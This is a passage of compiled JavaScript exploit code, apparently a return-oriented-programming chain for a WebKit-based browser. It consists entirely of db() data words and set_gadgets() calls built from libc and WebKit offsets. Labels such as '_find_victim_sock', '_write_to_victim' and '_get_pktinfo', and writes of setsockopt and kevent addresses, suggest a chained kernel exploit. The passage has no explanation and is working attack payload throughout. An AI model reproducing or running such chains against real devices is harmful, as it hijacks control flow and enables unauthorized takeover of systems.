db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+337920,//L6290
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L6290:
db([0,0]);
//L5863:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
kevent_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+339248,//L6291
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L6291:
db([0,0]);
//_write_to_victim:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+339320,//L6293
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6293:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+339384,//L6295
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6295:
db([0,0]);
set_gadget(libc_base+713278,);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+339472,//L6297
webkit_base+4687784,
libc_base+713278
]);
//L6296:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6297:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+339576,//L6300
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6298:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6300:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+339664,//L6302
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+339680,//L6303
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6302:
db([0,0]);
set_gadget(libc_base+772328,);
//L6303:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+339824,//L6306
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+339840,//L6307
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+339808,//L6305
webkit_base+4687784,
libc_base+713278
]);
//L6304:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L6305:
db([0,0]);
set_gadget(libc_base+772328,);
//L6306:
db([0,0]);
set_gadget(libc_base+768796,);
//L6307:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+339928,//L6309
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+339944,//L6310
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6309:
db([0,0]);
set_gadget(libc_base+772328,);
//L6310:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+340104,//L6312
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+340136,//L6314
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+340088,//L6311
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+340120,//L6313
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6311:
db([0,0]);
set_gadget(libc_base+165442,);
//L6312:
db([0,0]);
set_gadget(libc_base+772328,);
//L6313:
db([0,0]);
set_gadget(libc_base+768796,);
//L6314:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+340232,//L6316
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+340216,//L6315
webkit_base+4687784,
libc_base+165442
]);
//L6315:
db([0,0]);
set_gadget(libc_base+768796,);
//L6316:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6318:
ropchain+340336,//L6317
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+196160,//_get_pktinfo
//L6317:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+340424,//L6321
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6319:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L6321:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+340512,//L6323
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+340528,//L6324
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6323:
db([0,0]);
set_gadget(libc_base+772328,);
//L6324:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+340672,//L6327
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+340640,//L6325
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+340656,//L6326
webkit_base+4687784,
libc_base+165442
]);
//L6325:
db([0,0]);
set_gadget(libc_base+772328,);
//L6326:
db([0,0]);
set_gadget(libc_base+768796,);
//L6327:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+340768,//L6329
webkit_base+4687784,
libc_base+713278
]);
//L6328:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6329:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+340824,//L6331
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6331:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+340880,//L6333
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6333:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796
]);
//L6334:
db([20,0]);// 0x14
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+341032,//L6336
webkit_base+4687784,
libc_base+713278
]);
//L6335:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6336:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6337:
db([46,0]);// 0x2e
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6338:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+341232,//L6341
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6339:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6341:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+341320,//L6343
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+341336,//L6344
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6343:
db([0,0]);
set_gadget(libc_base+772328,);
//L6344:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+341480,//L6347
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+341496,//L6348
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+341464,//L6346
webkit_base+4687784,
libc_base+713278
]);
//L6345:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L6346:
db([0,0]);
set_gadget(libc_base+772328,);
//L6347:
db([0,0]);
set_gadget(libc_base+768796,);
//L6348:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+341584,//L6350
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+341600,//L6351
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6350:
db([0,0]);
set_gadget(libc_base+772328,);
//L6351:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+341760,//L6353
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+341792,//L6355
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+341744,//L6352
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+341776,//L6354
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6352:
db([0,0]);
set_gadget(libc_base+165442,);
//L6353:
db([0,0]);
set_gadget(libc_base+772328,);
//L6354:
db([0,0]);
set_gadget(libc_base+768796,);
//L6355:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+341888,//L6357
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+341872,//L6356
webkit_base+4687784,
libc_base+165442
]);
//L6356:
db([0,0]);
set_gadget(libc_base+768796,);
//L6357:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6359:
ropchain+341992,//L6358
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+343232,//L6360
//L6358:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+342136,//L6362
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+342152,//L6363
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+342120,//L6361
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6361:
db([0,0]);
set_gadget(libc_base+165442,);
//L6362:
db([0,0]);
set_gadget(libc_base+768796,);
//L6363:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+342280,//L6366
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+342312,//L6368
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+342296,//L6367
webkit_base+4687784,
libc_base+713278
]);
//L6365:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L6366:
db([0,0]);
set_gadget(libc_base+165442,);
//L6367:
db([0,0]);
set_gadget(libc_base+768796,);
//L6368:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+342424,//L6369+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+342416,//L6369
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L6369:
db([0,0]);
set_gadgets([
ropchain+342440,//L6369+24
ropchain+342904,//L6364
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+342512,//L6372
webkit_base+4687784,
libc_base+768796
]);
//L6370:
db([0,0]);
set_gadget(libc_base+165442,);
//L6371:
db([0,0]);
set_gadget(libc_base+772328,);
//L6372:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+342672,//L6374
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+342704,//L6376
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+342656,//L6373
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+342688,//L6375
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6373:
db([0,0]);
set_gadget(libc_base+165442,);
//L6374:
db([0,0]);
set_gadget(libc_base+772328,);
//L6375:
db([0,0]);
set_gadget(libc_base+768796,);
//L6376:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+342784,//L6377
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+342800,//L6378
webkit_base+4687784,
libc_base+165442
]);
//L6377:
db([0,0]);
set_gadget(libc_base+768796,);
//L6378:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+342896,//L6380
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+342880,//L6379
webkit_base+4687784,
libc_base+165442
]);
//L6379:
db([0,0]);
set_gadget(libc_base+768796,);
//L6380:
db([0,0]);
//L6364:
set_gadgets([
libc_base+713278,
ropchain+342984,//L6382
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+342968,//L6381
webkit_base+4687784,
libc_base+165442
]);
//L6381:
db([0,0]);
set_gadget(libc_base+768796,);
//L6382:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+343088,//L6383
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+343104,//L6384
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L6383:
db([0,0]);
set_gadget(libc_base+768796,);
//L6384:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+343224,//L6385
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+343208,//L6386
webkit_base+4687784,
libc_base+768796
]);
//L6386:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6385:
db([0,0]);
//L6360:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+344552,//L6387
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L6387:
db([0,0]);
//_find_victim_sock:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+344624,//L6389
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6389:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+344688,//L6391
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6391:
db([0,0]);
set_gadget(libc_base+713278,);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6392:
db([4294967272,4294967295]);// -0x18
set_gadget(libc_base+772328,);
//L6394:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+344816,//L6396
webkit_base+4687784,
libc_base+772328
]);
//L6395:
db([0,0]);
set_gadget(libc_base+768796,);
//L6396:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+344872,//L6399
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6399:
db([0,0]);
//L6397:
set_gadgets([
libc_base+713278,
ropchain+344936,//L6402
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6400:
db([4294967272,4294967295]);// -0x18
set_gadget(libc_base+772328,);
//L6402:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+345024,//L6404
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+345040,//L6405
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6404:
db([0,0]);
set_gadget(libc_base+772328,);
//L6405:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+345200,//L6407
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+345232,//L6409
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+345184,//L6406
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+345216,//L6408
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6406:
db([0,0]);
set_gadget(libc_base+165442,);
//L6407:
db([0,0]);
set_gadget(libc_base+772328,);
//L6408:
db([0,0]);
set_gadget(libc_base+768796,);
//L6409:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+345312,//L6410
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+345328,//L6411
webkit_base+4687784,
libc_base+165442
]);
//L6410:
db([0,0]);
set_gadget(libc_base+768796,);
//L6411:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+345424,//L6413
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+345408,//L6412
webkit_base+4687784,
libc_base+165442
]);
//L6412:
db([0,0]);
set_gadget(libc_base+768796,);
//L6413:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+345520,//L6415
webkit_base+4687784,
libc_base+768796
]);
//L6414:
db([512,0]);// 0x200
set_gadget(webkit_base+3789839,);//pop r11
//L6415:
db([0,0]);
set_gadget(libc_base+165442,);
//L6416:
db([512,0]);// 0x200
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+345664,//L6418
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+345680,//L6419
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+345648,//L6417
webkit_base+4687784,
libc_base+165442
]);
//L6417:
db([0,0]);
set_gadget(libc_base+772328,);
//L6418:
db([0,0]);
set_gadget(libc_base+768796,);
//L6419:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+345856,//L6421
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+345872,//L6422
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+345840,//L6420
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6420:
db([0,0]);
set_gadget(libc_base+165442,);
//L6421:
db([0,0]);
set_gadget(libc_base+768796,);
//L6422:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+346000,//L6425
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+346032,//L6427
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+346016,//L6426
webkit_base+4687784,
libc_base+713278
]);
//L6424:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L6425:
db([0,0]);
